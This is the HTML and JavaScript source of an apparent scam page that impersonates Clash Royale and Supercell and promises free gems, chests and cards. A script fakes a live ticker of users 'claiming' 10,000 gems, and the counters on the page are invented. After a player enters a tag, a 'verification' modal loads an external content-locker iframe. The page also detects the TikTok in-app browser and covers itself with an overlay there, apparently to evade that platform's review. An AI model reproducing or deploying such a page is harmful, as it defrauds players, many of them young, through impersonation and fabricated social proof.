<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clash Royale - Premium Rewards</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --cr-light-blue: #00d2ff;
            --cr-dark-blue: #0056b3;
            --cr-gold: #ffcc00;
            --cr-white: #ffffff;
            --card-border: #ffcc00;
        }

        body {
            margin: 0; padding: 0;
            background-color: var(--cr-light-blue);
            font-family: 'Lilita One', cursive;
            color: white; text-align: center;
            overflow-x: hidden;
            background-image: radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%), radial-gradient(rgba(255,255,255,0.2) 15%, transparent 15%);
            background-position: 0 0, 25px 25px;
            background-size: 50px 50px;
            animation: moveBackground 4s linear infinite;
        }

        @keyframes moveBackground { from { background-position: 0 0, 25px 25px; } to { background-position: 50px 50px, 75px 75px; } }

        /* --- TIKTOK OVERLAY --- */
        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
        #tutorialGif { width: 100%; height: 100%; object-fit: cover; }

        /* TOP NOTIFICATION (Brawl Style) */
        .live-bar { background: rgba(0,0,0,0.6); padding: 8px 0; font-size: 12px; height: 20px; position: relative; }
        #liveText { transition: all 0.5s ease; display: inline-block; }

        .logo-container { margin: 25px 0; }
        .logo { width: 170px; filter: drop-shadow(0 8px 12px rgba(0,0,0,0.4)); }

        /* STATS PANEL (Brawl Style) */
        .stats-panel {
            background: rgba(0, 50, 120, 0.85); border: 3px solid var(--cr-gold);
            border-radius: 25px; display: inline-flex; gap: 40px; padding: 20px 45px; margin-bottom: 30px;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.6); align-items: center;
        }
        .stat-box { display: flex; flex-direction: column; align-items: center; min-width: 100px; }
        .stat-val { font-size: 28px; text-shadow: 2px 2px #000; letter-spacing: 1px; color: var(--cr-gold); }

        .container {
            width: 95%; max-width: 500px; margin: 0 auto;
            background: rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 25px 15px;
        }

        /* 3-COLUMN GRID nichan bhal l-photo */
        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }

        .card {
            background: var(--cr-white); border: 2.5px solid var(--cr-gold); border-radius: 20px;
            padding: 15px 5px; position: relative; overflow: hidden;
            box-shadow: 0 6px 12px rgba(0,0,0,0.3); display: flex; flex-direction: column; align-items: center;
        }
        .card::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: repeating-conic-gradient(from 0deg, rgba(255, 204, 0, 0) 0deg 15deg, rgba(255, 204, 0, 0.08) 15deg 30deg);
            animation: rotateSun 10s linear infinite; z-index: 0;
        }
        @keyframes rotateSun { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .item-name { font-size: 10px; color: #004a8d; z-index: 2; text-transform: uppercase; height: 26px; font-weight: bold; }
        .img-box { height: 75px; display: flex; align-items: center; justify-content: center; z-index: 2; margin: 5px 0; }
        .item-img { max-width: 90%; max-height: 100%; filter: drop-shadow(0 5px 8px rgba(0,0,0,0.2)); }
        .price-line { color: #28a745; font-size: 11px; margin-bottom: 8px; z-index: 2; }

        .btn-claim {
            background: linear-gradient(180deg, var(--cr-light-blue) 0%, var(--cr-dark-blue) 100%);
            border: none; border-bottom: 4px solid #003366; border-radius: 12px;
            color: white; font-size: 15px; padding: 8px 0; width: 92%; cursor: pointer; z-index: 2; font-family: 'Lilita One';
        }

        /* MODAL STYLE */
        .modal-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            display: none; justify-content: center; align-items: center; z-index: 1000;
        }
        .modal-box {
            background: var(--cr-white); width: 85%; max-width: 400px;
            border: 5px solid var(--cr-gold); border-radius: 30px;
            padding: 30px 15px; color: #004a8d;
        }

        .modal-input {
            background: #f0f0f0; border: 3px solid var(--cr-gold); border-radius: 18px;
            width: 90%; padding: 15px; font-family: 'Lilita One'; font-size: 22px; 
            text-align: center; color: #333; outline: none; margin: 20px 0;
        }

        .btn-continue {
            background: linear-gradient(180deg, #ffcc00 0%, #ff9900 100%);
            border: none; border-bottom: 6px solid #b36b00; border-radius: 15px;
            color: white; font-family: 'Lilita One'; font-size: 32px;
            padding: 12px 0; width: 100%; cursor: pointer; text-shadow: 2px 2px 0 #b36b00;
        }

        /* FOOTER NICHAN BHAL L-PHOTO */
        footer { margin-top: 60px; background: #000; padding: 50px 20px; text-align: left; color: #ffffff; font-family: sans-serif; }
        .footer-top { display: flex; justify-content: space-between; max-width: 500px; margin: 0 auto 30px auto; flex-wrap: wrap; gap: 20px; }
        .store-btns img { height: 40px; border-radius: 5px; border: 1px solid #333; margin-right: 5px; }
        .footer-bottom { max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between; border-top: 1px solid #333; padding-top: 30px; }
        .legal-links { display: flex; flex-direction: column; gap: 12px; }
        .legal-links a { color: white; text-decoration: none; font-size: 14px; font-weight: bold; opacity: 0.8; }
        .sc-logo-footer { width: 120px; margin-top: 20px; }
    </style>
</head>
<body onclick="document.getElementById('ttOverlay').style.display='none'">

    <div id="ttOverlay"><img src="tutorial.gif" id="tutorialGif"></div>

    <div class="live-bar">
        <span id="liveText">🔥 <b>Jaxson_BS</b> claimed <span>2000 GEMS!</span></span>
    </div>

    <div class="logo-container">
        <img src="https://link.clashroyale.com/images/cr-logo-white.png" class="logo">
    </div>

    <div class="stats-panel">
        <div class="stat-box">
            <div style="font-size: 10px;"><span style="color:#ff4444;">●</span> LIVE</div>
            <span class="stat-val" id="claimed">3,122</span>
        </div>
        <div class="stat-box">
            <div style="font-size: 10px;"><span style="color:#00ccff;">●</span> ONLINE</div>
            <span class="stat-val" id="online">1,088</span>
        </div>
    </div>

    <div class="container">
        <div style="font-size:20px; margin-bottom:20px; text-shadow: 2px 2px #000;">CHOOSE YOUR REWARD</div>
        <div class="grid" id="mainGrid"></div>
    </div>

    <!-- Modals -->
    <div class="modal-overlay" id="modalTag">
        <div class="modal-box">
            <h2 style="margin:0">CONNECT PLAYER</h2>
            <input type="text" class="modal-input" id="playerTag" placeholder="#PLAYER_TAG" maxlength="12">
            <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
        </div>
    </div>

    <div class="modal-overlay" id="modalLocker">
        <div class="modal-box">
            <h2 style="margin:0">VERIFICATION</h2>
            <div style="background:#000; border-radius:20px; height:400px; margin-top:15px; overflow:hidden;">
                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-top">
            <div>
                <h4>Download our games</h4>
                <div class="store-btns">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
                </div>
            </div>
            <div>
                <h4>Follow us</h4>
                <div style="font-size: 22px; display: flex; gap: 15px;">
                    <i class="fab fa-youtube"></i> <i class="fab fa-facebook-f"></i> <i class="fab fa-discord"></i>
                </div>
            </div>
        </div>
        <div class="footer-bottom">
            <div class="legal-links">
                <a href="#">Terms of Service</a>
                <a href="#">Privacy Policy</a>
                <a href="#">Parent's Guide</a>
                <a href="#">Safe and Fair Play</a>
                <a href="#">Other Legal Docs</a>
            </div>
            <div style="text-align: right;">
                <p style="font-size: 12px; opacity: 0.6;">Supercell Oy<br>Jätkäsaarenlaituri 1<br>00180 Helsinki, Finland</p>
                <img src="https://supercell.com/images/800/logo_supercell@2x.png" class="sc-logo-footer">
            </div>
        </div>
    </footer>

    <script>
        const rewardsData = [
            {n: "10,000 GEMS", q: "X24", img: "gems5000.PNG"},
            {n: "LEGENDARY CHEST", q: "X1", img: "chest5stars.PNG"},
            {n: "EVO KNIGHT", q: "X1", img: "evoknight.PNG"},
            {n: "MAGIC ARCHER", q: "X1", img: "archer.PNG"},
            {n: "BALLOON", q: "X1", img: "Balloon.PNG"},
            {n: "KNIGHT", q: "X1", img: "Knight.PNG"},
            {n: "PRINCE", q: "X1", img: "prince.PNG"},
            {n: "WIZARD", q: "X1", img: "wizard.PNG"},
            {n: "MUSKETEER", q: "X1", img: "musketeer.PNG"},
            {n: "GIANT", q: "X1", img: "giant.PNG"},
            {n: "GOLEM", q: "X1", img: "golem.PNG"},
            {n: "MINI P.E.K.K.A", q: "X1", img: "minipekka.PNG"},
            {n: "BARBARIAN BARREL", q: "X1", img: "barrel.PNG"},
            {n: "MEGA MINION", q: "X1", img: "Minion.PNG"},
            {n: "GOBLINS", q: "X1", img: "goblins.PNG"}
        ];

        const grid = document.getElementById('mainGrid');
        rewardsData.forEach(r => {
            grid.innerHTML += `<div class="card">
                <div class="item-name">${r.n}</div>
                <div class="img-box"><img src="./${r.img}" class="item-img" onerror="this.src='https://via.placeholder.com/80'"></div>
                <div class="price-line">${r.q} FREE</div>
                <button class="btn-claim" onclick="openTagModal()">CLAIM</button>
            </div>`;
        });

        // Live Ticker Logic
        const users = ["Mohamed_JKK", "Zeneex_99", "Daniel_Ulta", "Alpha_CR", "Pro_Gamer"];
        setInterval(() => {
            const liveText = document.getElementById('liveText');
            liveText.style.opacity = '0';
            setTimeout(() => {
                const u = users[Math.floor(Math.random()*users.length)];
                liveText.innerHTML = `🔥 <b>${u}</b> claimed <span>10,000 GEMS!</span>`;
                liveText.style.opacity = '1';
            }, 500);
        }, 4000);

        function openTagModal() { document.getElementById('modalTag').style.display = 'flex'; }
        function goToLocker() {
            if(document.getElementById('playerTag').value.length > 2) {
                document.getElementById('modalTag').style.display = 'none';
                document.getElementById('modalLocker').style.display = 'flex';
            }
        }

        window.addEventListener("load", () => {
            if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
                document.getElementById("ttOverlay").style.display = "block";
            }
        });
    </script>
</body>
</html>
